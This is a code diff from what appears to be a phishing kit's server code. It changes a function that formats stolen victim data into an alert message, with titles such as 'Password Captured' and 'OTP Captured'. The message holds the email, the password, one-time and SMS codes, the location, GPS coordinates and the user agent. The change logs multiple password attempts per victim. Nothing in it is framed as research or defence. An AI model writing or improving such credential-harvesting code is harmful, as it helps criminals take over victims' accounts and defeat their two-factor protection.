@@ -88,14 +88,33 @@ function esc(s) {
 
 function buildMessage(type, s, ip, loc, ua) {
   const titles = { EMAIL:'📧 New Submission', PASSWORD:'🔐 Password Captured', OTP:'🔑 OTP Captured', SMS_CODE:'💬 SMS Code Captured', PHONE_CODE:'📞 Phone Captured' };
-  const ts = new Date().toISOString().replace('T',' ').split('.')[0];
-  return `🔔 <b>${esc(titles[type]||'📋 Data Received')}</b>
+  const ts  = new Date().toISOString().replace('T',' ').split('.')[0];
+  const otp = s.otp        || '—';
+  const sms = s.sms_code   || '—';
+  const ph  = s.phone_code || '—';
 
-📧 <b>Email:</b> <code>${esc(s.email||'—')}</code>
-🔐 <b>Password:</b> <code>${esc(s.password||'—')}</code>
-🔑 <b>OTP:</b> <code>${esc(s.otp||'—')}</code>
-💬 <b>SMS Code:</b> <code>${esc(s.sms_code||'—')}</code>
-📞 <b>Phone:</b> <code>${esc(s.phone_code||'—')}</code>
+  // Password field may be a JSON array of attempts e.g. '["pw1","pw2"]'
+  let pwLines = '';
+  try {
+    const attempts = JSON.parse(s.password || 'null');
+    if (Array.isArray(attempts) && attempts.length > 0) {
+      pwLines = attempts.map((p, i) =>
+        `🔐 <b>Password ${i + 1}:</b> <code>${esc(String(p))}</code>`
+      ).join('\n');
+    } else {
+      pwLines = `🔐 <b>Password:</b> <code>${esc(s.password || '—')}</code>`;
+    }
+  } catch {
+    pwLines = `🔐 <b>Password:</b> <code>${esc(s.password || '—')}</code>`;
+  }
+
+  return `🔔 <b>${esc(titles[type] || '📋 Data Received')}</b>
+
+📧 <b>Email:</b> <code>${esc(s.email || '—')}</code>
+${pwLines}
+🔑 <b>OTP:</b> <code>${esc(otp)}</code>
+💬 <b>SMS Code:</b> <code>${esc(sms)}</code>
+📞 <b>Phone:</b> <code>${esc(ph)}</code>
 
 📍 <b>Location:</b> ${esc(`${loc.city}, ${loc.region}, ${loc.country}`)}
 🗺 <b>GPS:</b> ${esc(`${loc.lat}, ${loc.lon}`)}
